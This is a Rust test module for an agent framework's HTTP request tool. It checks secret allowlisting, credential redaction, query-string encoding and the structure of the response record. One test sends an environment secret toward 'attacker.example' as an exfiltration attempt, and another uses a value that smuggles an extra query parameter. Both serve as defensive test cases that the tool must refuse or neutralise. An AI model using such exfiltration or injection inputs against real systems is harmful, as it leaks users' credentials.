        std::env::set_var("FLUX_WEB_TEST_TOKEN", "super-secret-42");
        let base = one_shot("200 OK", "ok").await;
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_TOKEN"]);
        let c = ctx();
        t.execute(
            &c,
            json!({
                "url": base,
                "headers": { "authorization": { "$secret": "FLUX_WEB_TEST_TOKEN" } }
            }),
        )
        .await
        .unwrap();
        // The resolved token was registered with the redactor, so it is scrubbed everywhere output
        // or logs might carry it.
        let scrubbed = c.redactor.redact("leak: super-secret-42 end");
        assert!(
            !scrubbed.contains("super-secret-42"),
            "the resolved secret must be redacted: {scrubbed}"
        );
    }

    #[tokio::test]
    async fn missing_secret_header_env_is_a_clean_error() {
        let base = one_shot("200 OK", "ok").await;
        // Allowlisted but unset: the request passes the allowlist gate and then fails cleanly on
        // the missing value (not the allowlist refusal).
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_DEFINITELY_UNSET"]);
        let err = t
            .execute(
                &ctx(),
                json!({
                    "url": base,
                    "headers": { "authorization": { "$secret": "FLUX_WEB_DEFINITELY_UNSET" } }
                }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("FLUX_WEB_DEFINITELY_UNSET") && err.contains("not set"),
            "names the missing var: {err}"
        );
    }

    /// C-76: a `$secret` naming an env var that is NOT on the allowlist must be refused — even when
    /// the var is set in the environment — and its value must never be read or sent. This is the
    /// single-call exfiltration primitive the story closes.
    #[tokio::test]
    async fn secret_ref_to_non_allowlisted_env_var_is_refused() {
        std::env::set_var("FLUX_WEB_STOLEN_TOKEN", "exfiltrate-me");
        let base = one_shot("200 OK", "ok").await;
        // Deny-all allowlist, though the classic exfil target is present in the environment.
        let t = tool_allowing(PrivateNetAllow::Any, &[]);
        let err = t
            .execute(
                &ctx(),
                json!({
                    "url": base,
                    "headers": { "x-api-key": { "$secret": "FLUX_WEB_STOLEN_TOKEN" } }
                }),
            )
            .await
            .expect_err("a non-allowlisted secret ref must be refused, not sent");
        let msg = err.to_string();
        assert!(
            msg.contains("allowlist") && !msg.contains("exfiltrate-me"),
            "refusal must name the allowlist and never leak the value: {msg}"
        );
    }

    /// C-303 — the injection this story closes. A query value carrying `&injected=1` (plus `#`,
    /// `=`, a space and a non-ASCII character) must arrive as **one** encoded parameter.
    ///
    /// The first half of the test is the hazard itself: the only spelling available before this
    /// story was to interpolate the value into the URL, and that puts a second, attacker-chosen
    /// parameter on the wire. The second half is the `query` map, which must not.
    #[tokio::test]
    async fn query_value_cannot_inject_additional_parameters() {
        const HOSTILE: &str = "puppies&injected=1#frag = ü";

        // The hazard, for the record: interpolated into the URL, the value *is* two parameters.
        let (base, seen) = capture_request().await;
        let t = tool(PrivateNetAllow::Any);
        t.execute(
            &ctx(),
            json!({ "url": format!("{base}/search?q={HOSTILE}") }),
        )
        .await
        .unwrap();
        let interpolated = request_line(&seen.await.unwrap());
        assert!(
            interpolated.contains("injected=1") && !interpolated.contains("%26injected"),
            "the interpolated spelling smuggles a second parameter (that is the bug): \
             {interpolated}"
        );

        // The fix: the same value handed to the structured `query` map is one encoded parameter.
        let (base, seen) = capture_request().await;
        t.execute(
            &ctx(),
            json!({ "url": format!("{base}/search"), "query": { "q": HOSTILE } }),
        )
        .await
        .unwrap();
        let line = request_line(&seen.await.unwrap());
        assert!(
            line.contains("q=puppies%26injected%3D1%23frag%20%3D%20%C3%BC"),
            "every reserved byte percent-encoded per RFC 3986 (`&` `=` `#`, space as %20, \
             non-ASCII as UTF-8): {line}"
        );
        assert!(
            !line.contains("&injected") && !line.contains("&"),
            "exactly one parameter reached the transport — no `&` separator was introduced by the \
             value: {line}"
        );
    }

    /// L-101's rule, applied to the query: `null` means "do not send this parameter", but `false`
    /// and `0` are values. Getting this backwards silently drops a `?active=false` filter.
    #[tokio::test]
    async fn query_omits_a_null_but_sends_false_and_zero() {
        let (base, seen) = capture_request().await;
        tool(PrivateNetAllow::Any)
            .execute(
                &ctx(),
                json!({
                    "url": format!("{base}/items"),
                    "query": { "active": false, "cursor": null, "offset": 0, "ratio": 1.5 }
                }),
            )
            .await
            .unwrap();
        let line = request_line(&seen.await.unwrap());
        // Sorted key order, so the URL a given record produces is stable run to run.
        assert!(
            line.starts_with("GET /items?active=false&offset=0&ratio=1.5 "),
            "false and 0 are sent, null is omitted, keys are sorted: {line}"
        );
        assert!(
            !line.contains("cursor"),
            "a null parameter is omitted: {line}"
        );
    }

    /// A URL that already carries a `?` must not grow a second one — the appender owns the
    /// separator and switches to `&`.
    #[tokio::test]
    async fn query_appends_to_a_url_that_already_has_a_question_mark() {
        let (base, seen) = capture_request().await;
        tool(PrivateNetAllow::Any)
            .execute(
                &ctx(),
                json!({ "url": format!("{base}/s?page=2"), "query": { "q": "cats" } }),
            )
            .await
            .unwrap();
        let line = request_line(&seen.await.unwrap());
        assert!(
            line.starts_with("GET /s?page=2&q=cats "),
            "the existing query keeps the `?` and the appended parameter uses `&`: {line}"
        );
        assert_eq!(line.matches('?').count(), 1, "exactly one `?`: {line}");
    }

    /// The `?`-ownership rule as a unit, including the two spellings a hand-built URL arrives in
    /// (a bare trailing `?`, and a fragment that must stay behind the query).
    #[test]
    fn append_query_owns_the_separator_and_keeps_the_fragment_last() {
        let one = [("a".to_string(), "1".to_string())];
        assert_eq!(
            append_query("https://h/p", &one).unwrap(),
            "https://h/p?a=1"
        );
        assert_eq!(
            append_query("https://h/p?x=0", &one).unwrap(),
            "https://h/p?x=0&a=1"
        );
        // A URL already ending on a separator must not gain a second one.
        assert_eq!(
            append_query("https://h/p?", &one).unwrap(),
            "https://h/p?a=1"
        );
        assert_eq!(
            append_query("https://h/p?x=0&", &one).unwrap(),
            "https://h/p?x=0&a=1"
        );
        // The fragment is not part of the query and stays last.
        assert_eq!(
            append_query("https://h/p#frag", &one).unwrap(),
            "https://h/p?a=1#frag"
        );
        // No fields at all leaves the URL byte-identical.
        assert_eq!(
            append_query("https://h/p#frag", &[]).unwrap(),
            "https://h/p#frag"
        );
    }

    /// A key supplied both in the URL and in `query` is refused rather than sent twice: a repeated
    /// parameter is first-wins on some servers and last-wins on others, so "last wins" is not a
    /// decision this op is entitled to make on the caller's behalf.
    #[tokio::test]
    async fn a_duplicate_query_key_is_an_error() {
        let err = tool(PrivateNetAllow::Any)
            .execute(
                &ctx(),
                json!({ "url": "https://example.com/s?q=first", "query": { "q": "second" } }),
            )
            .await
            .expect_err("a key already in the URL must be refused, not appended");
        let msg = err.to_string();
        assert!(
            msg.contains("`q` is already present") && msg.contains("refuses"),
            "the refusal names the key and says why: {msg}"
        );
    }

    /// A nested value has no agreed query spelling, so it is refused — and the diagnostic names the
    /// shape, never the value (a query parameter routinely carries a customer identifier).
    #[test]
    fn a_nested_query_value_is_refused_without_naming_the_value() {
        let err = query_fields(&json!({ "query": { "filter": { "id": "cus_secret" } } }))
            .expect_err("a nested query value must be refused");
        let msg = err.to_string();
        assert!(
            msg.contains("`filter`") && msg.contains("a record"),
            "{msg}"
        );
        assert!(
            !msg.contains("cus_secret"),
            "the value must not leak: {msg}"
        );
    }

    /// The egress allow-list and the evidence log must see the URL as sent — encoded query and all
    /// — not the pre-query template.
    #[test]
    fn permission_subjects_and_the_intent_report_the_encoded_url() {
        let t = tool(PrivateNetAllow::None);
        let params = json!({
            "url": "https://api.example.com/search",
            "query": { "q": "a&b", "page": 2 }
        });
        let expected = "https://api.example.com/search?page=2&q=a%26b";
        assert_eq!(t.permission_subjects(&params), vec![expected.to_string()]);
        let set = t.intents(&params);
        let intent = set.intents.first().expect("one intent");
        assert!(
            matches!(&intent.target, IntentTarget::Url { url } if url == expected),
            "the NetworkFetch intent carries the encoded URL: {:?}",
            intent.target
        );
        assert!(matches!(intent.behavior, IntentBehavior::NetworkFetch));
    }

    /// A query-placed credential goes on the wire but **not** into a subject: `permission_subjects`
    /// cannot fail, so it cannot consult a redactor, and a subject is persisted and matched against
    /// grants. Reporting the unauthenticated URL is the property the connector pack preserves and
    /// this must not regress.
    #[tokio::test]
    async fn a_query_placed_credential_stays_out_of_the_subject_and_is_redacted() {
        // A credential whose encoded spelling differs from its raw one — that is the case a
        // redactor seeded only with the raw value would miss.
        std::env::set_var("FLUX_WEB_TEST_QUERY_KEY", "sk-live/99 99");
        let params = json!({
            "url": "https://api.example.com/v1/x",
            "query": { "api_key": { "$secret": "FLUX_WEB_TEST_QUERY_KEY" }, "q": "hi" }
        });
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_QUERY_KEY"]);
        let subjects = t.permission_subjects(&params);
        assert_eq!(
            subjects,
            vec!["https://api.example.com/v1/x?q=hi".to_string()]
        );
        assert!(
            !subjects[0].contains("api_key") && !subjects[0].contains("sk-live"),
            "neither the credential nor its parameter reaches a subject: {subjects:?}"
        );

        // …but it does reach the wire, encoded, and both spellings are registered with the
        // redactor so a quoted URL in an error can never carry it.
        let (base, seen) = capture_request().await;
        let c = ctx();
        t.execute(
            &c,
            json!({
                "url": format!("{base}/v1/x"),
                "query": { "api_key": { "$secret": "FLUX_WEB_TEST_QUERY_KEY" } }
            }),
        )
        .await
        .unwrap();
        let line = request_line(&seen.await.unwrap());
        assert!(
            line.contains("api_key=sk-live%2F99%2099"),
            "the credential is sent, encoded: {line}"
        );
        for spelling in ["sk-live/99 99", "sk-live%2F99%2099"] {
            let scrubbed = c.redactor.redact(&format!("url: {spelling} end"));
            assert!(
                !scrubbed.contains(spelling),
                "the {spelling} spelling must be redacted: {scrubbed}"
            );
        }
    }

    /// The allowlist gate is the same one headers go through — a `$secret` in a query parameter
    /// naming a non-allowlisted var is refused before its value is read (C-76).
    #[tokio::test]
    async fn a_non_allowlisted_secret_in_a_query_parameter_is_refused() {
        std::env::set_var("FLUX_WEB_STOLEN_QUERY_TOKEN", "exfiltrate-me-too");
        let err = tool_allowing(PrivateNetAllow::Any, &[])
            .execute(
                &ctx(),
                json!({
                    "url": "https://attacker.example/",
                    "query": { "leak": { "$secret": "FLUX_WEB_STOLEN_QUERY_TOKEN" } }
                }),
            )
            .await
            .expect_err("a non-allowlisted secret ref must be refused, not sent");
        let msg = err.to_string();
        assert!(
            msg.contains("allowlist") && !msg.contains("exfiltrate-me-too"),
            "refusal names the allowlist and never leaks the value: {msg}"
        );
    }

    // -----------------------------------------------------------------------------------------
    // C-304 — the result is a record
    // -----------------------------------------------------------------------------------------

    /// The shape itself: canonical `content` is the record `{status, headers, body}`, the status is
    /// a NUMBER (not a substring of a rendered line), the headers are a map, and a JSON body is
    /// parsed — which is what lets a caller select `.body.data.id` at all.
    #[tokio::test]
    async fn the_result_is_a_record_with_a_numeric_status_a_header_map_and_a_parsed_body() {
        let base = one_shot_with_headers(
            "200 OK",
            vec!["content-type: application/json".into(), "x-rate: 7".into()],
            r#"{"data":{"id":"cus_42"},"page":2}"#.into(),
        )
        .await;
        let r = tool(PrivateNetAllow::Any)
            .execute(&ctx(), json!({ "url": base }))
            .await
            .unwrap();
        let record = record(&r);
        assert_eq!(record["status"], 200);
        assert!(
            record["status"].is_number(),
            "the status is a number a flow can compare: {record}"
        );
        assert_eq!(record["headers"]["content-type"], "application/json");
        assert_eq!(record["headers"]["x-rate"], "7");
        // The point of the story: a field, not a blob.
        assert_eq!(record["body"]["data"]["id"], "cus_42");
        assert_eq!(record["body"]["page"], 2);
        assert_eq!(
            record.as_object().map(|o| o.len()),
            Some(3),
            "exactly `status`, `headers` and `body`: {record}"
        );
    }

    /// The declared `output_schema` — without it a caller has to read the source to learn the shape,
    /// and the analyzer carries no result type at all.
    #[test]
    fn the_spec_declares_the_response_schema() {
        let schema = tool(PrivateNetAllow::None)
            .spec()
            .output_schema
            .expect("`http.request` declares an output_schema");
        assert_eq!(schema["type"], "object");
        let properties = schema["properties"]
            .as_object()
            .expect("the schema describes properties");
        for field in ["status", "headers", "body"] {
            assert!(properties.contains_key(field), "schema omits `{field}`");
        }
        assert_eq!(schema["properties"]["status"]["type"], "integer");
        assert_eq!(schema["properties"]["headers"]["type"], "object");
        // `body` is deliberately untyped — see `parse_body`. Declaring `string` or `object` would be
        // wrong for half of all responses, and a false schema is worse than none.
        assert!(
            schema["properties"]["body"].get("type").is_none(),
            "`body` must not claim one type: {schema}"
        );
        assert_eq!(
            schema["required"],
            json!(["status", "headers", "body"]),
            "every field is always present"
        );
        // And the spec is coherent by the shared checker, not by eye.
        assert!(
            flux_spec::metadata_violations(&tool(PrivateNetAllow::None).spec(), &[]).is_empty(),
            "the finished spec must satisfy the shared coherence rules"
        );
    }

    /// A non-JSON, malformed, or empty body does not fail the call: the record keeps its status and
    /// headers and the body falls through to the raw text. A `404` serving an HTML error page is a
    /// *result* — the same posture as "provider bytes never error a chunk stream".
    #[tokio::test]
    async fn a_non_json_or_empty_body_still_produces_a_usable_record() {
        for (status_line, expected_status, body) in [
            ("404 Not Found", 404, "<html><body>Not Found</body></html>"),
            ("500 Internal Server Error", 500, ""),
            // Truncated/malformed JSON — the shape a capped or cut-off response actually arrives in.
            ("200 OK", 200, r#"{"data":{"id":"cus_4"#),
            // A bare JSON scalar stays the text it was (the interpreter's own rule).
            ("200 OK", 200, "42"),
        ] {
            let base =
                one_shot_with_headers(status_line, vec!["x-trace: abc".into()], body.into()).await;
            let r = tool(PrivateNetAllow::Any)
                .execute(&ctx(), json!({ "url": base }))
                .await
                .unwrap_or_else(|e| panic!("`{status_line}` with {body:?} must not fail: {e}"));
            assert!(!r.is_error, "a {status_line} is a result, not an error");
            let record = record(&r);
            assert_eq!(record["status"], expected_status, "status intact: {record}");
            assert_eq!(
                record["headers"]["x-trace"], "abc",
                "headers intact: {record}"
            );
            assert_eq!(
                record["body"], body,
                "an unparseable body is carried as its raw text: {record}"
            );
        }
    }

    /// The human-facing rendering does not regress: the `view` is the same `HTTP <status>` block a
    /// person read before the record existed, and it is the view — not the canonical JSON — that the
    /// sink and the model are shown.
    #[tokio::test]
    async fn the_human_view_keeps_the_pre_record_rendering() {
        let base = one_shot_with_headers(
            "404 Not Found",
            vec!["content-type: text/html".into()],
            "<h1>nope</h1>".into(),
        )
        .await;
        let r = tool(PrivateNetAllow::Any)
            .execute(&ctx(), json!({ "url": base }))
            .await
            .unwrap();
        let view = r.view.as_deref().expect("a record result carries a view");
        assert!(
            view.starts_with("HTTP 404 Not Found\n"),
            "the status line is unchanged: {view}"
        );
        assert!(
            view.contains("content-type: text/html\n"),
            "the header block is unchanged: {view}"
        );
        assert!(view.ends_with("<h1>nope</h1>"), "the body is last: {view}");
    }

    /// A repeated response header (`set-cookie` is the one that actually repeats) cannot be a
    /// duplicate key in a JSON object. Both values must survive — dropping either silently changes
    /// what the response said.
    #[tokio::test]
    async fn a_repeated_response_header_keeps_both_values() {
        let base = one_shot_with_headers(
            "200 OK",
            vec!["set-cookie: a=1".into(), "set-cookie: b=2".into()],
            "ok".into(),
        )
        .await;
        let r = tool(PrivateNetAllow::Any)
            .execute(&ctx(), json!({ "url": base }))
            .await
            .unwrap();
        assert_eq!(record(&r)["headers"]["set-cookie"], "a=1, b=2");
    }

    /// **The security half of C-304.** The response is the one place a request credential can come
    /// back at you: a vendor that echoes the token into `set-cookie` and into its JSON body.
    ///
    /// Redaction must survive the record. The secret here contains a `"` and a `\` on purpose —
    /// those are ESCAPED by JSON encoding, so a redactor applied only to the finished `content`
    /// (which is what the dispatcher does) would no longer find the literal value. The structured
    /// return must not become the one shape in which a token reaches a model-visible surface.
    #[tokio::test]
    async fn a_credential_echoed_back_in_a_response_header_or_body_is_still_redacted() {
        const TOKEN: &str = r#"sk-live"back\slash"#;
        std::env::set_var("FLUX_WEB_TEST_ECHO_TOKEN", TOKEN);
        let base = one_shot_with_headers(
            "200 OK",
            vec![format!("set-cookie: session={TOKEN}")],
            format!(
                r#"{{"echoed":"{}"}}"#,
                TOKEN.replace('\\', "\\\\").replace('"', "\\\"")
            ),
        )
        .await;
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_ECHO_TOKEN"]);
        let c = ctx();
        let r = t
            .execute(
                &c,
                json!({
                    "url": base,
                    "headers": { "authorization": { "$secret": "FLUX_WEB_TEST_ECHO_TOKEN" } }
                }),
            )
            .await
            .unwrap();
        assert!(
            !r.content.contains("sk-live"),
            "the echoed credential must not survive in the record: {}",
            r.content
        );
        assert!(
            !r.view.as_deref().unwrap_or_default().contains("sk-live"),
            "nor in the view a person and the model are shown: {:?}",
            r.view
        );
        // …and it is genuinely gone from the structured fields, not merely absent from a rendering.
        let record = record(&r);
        assert_eq!(record["headers"]["set-cookie"], "session=[redacted]");
        assert_eq!(record["body"]["echoed"], "[redacted]");
    }

    /// The record changed what a caller *reads*; it must not change what the envelope is *told*.
    /// `permission_subjects` and the `NetworkFetch` intent still report the encoded request URL —
    /// a grant is matched against a subject, so a drift here is a security change, not a cosmetic
    /// one. (The positive form is asserted in
    /// `permission_subjects_and_the_intent_report_the_encoded_url`; this pins that the response
    /// shape has no say in it.)
    #[tokio::test]
    async fn the_record_does_not_change_what_the_envelope_is_told() {
        let base = one_shot_with_headers("200 OK", Vec::new(), r#"{"id":1}"#.into()).await;
        let params = json!({ "url": format!("{base}/v1/x"), "query": { "q": "a&b" } });
        let t = tool(PrivateNetAllow::Any);
        let expected = format!("{base}/v1/x?q=a%26b");
        assert_eq!(t.permission_subjects(&params), vec![expected.clone()]);
        assert!(matches!(
            &t.intents(&params).intents[0].target,
            IntentTarget::Url { url } if *url == expected
        ));
        // Executing changes neither: the subject is a function of the request, not the response.
        t.execute(&ctx(), params.clone()).await.unwrap();
        assert_eq!(t.permission_subjects(&params), vec![expected]);
    }

    #[test]
    fn guard_allows_public_refuses_private() {
        // The scope semantics the whole family shares: a public host passes even offline (the guard
        // only errors when a name *resolves* to a private range); a loopback literal is refused
        // without a grant and admitted with one.
        assert!(
            flux_system::net::guard_url_scoped("https://example.com/", &PrivateNetAllow::None)
                .is_ok()
        );
        assert!(
            flux_system::net::guard_url_scoped("http://127.0.0.1:9/", &PrivateNetAllow::None)
                .is_err()
        );
        assert!(
            flux_system::net::guard_url_scoped("http://127.0.0.1:9/", &PrivateNetAllow::Any)
                .is_ok()
        );
    }
}
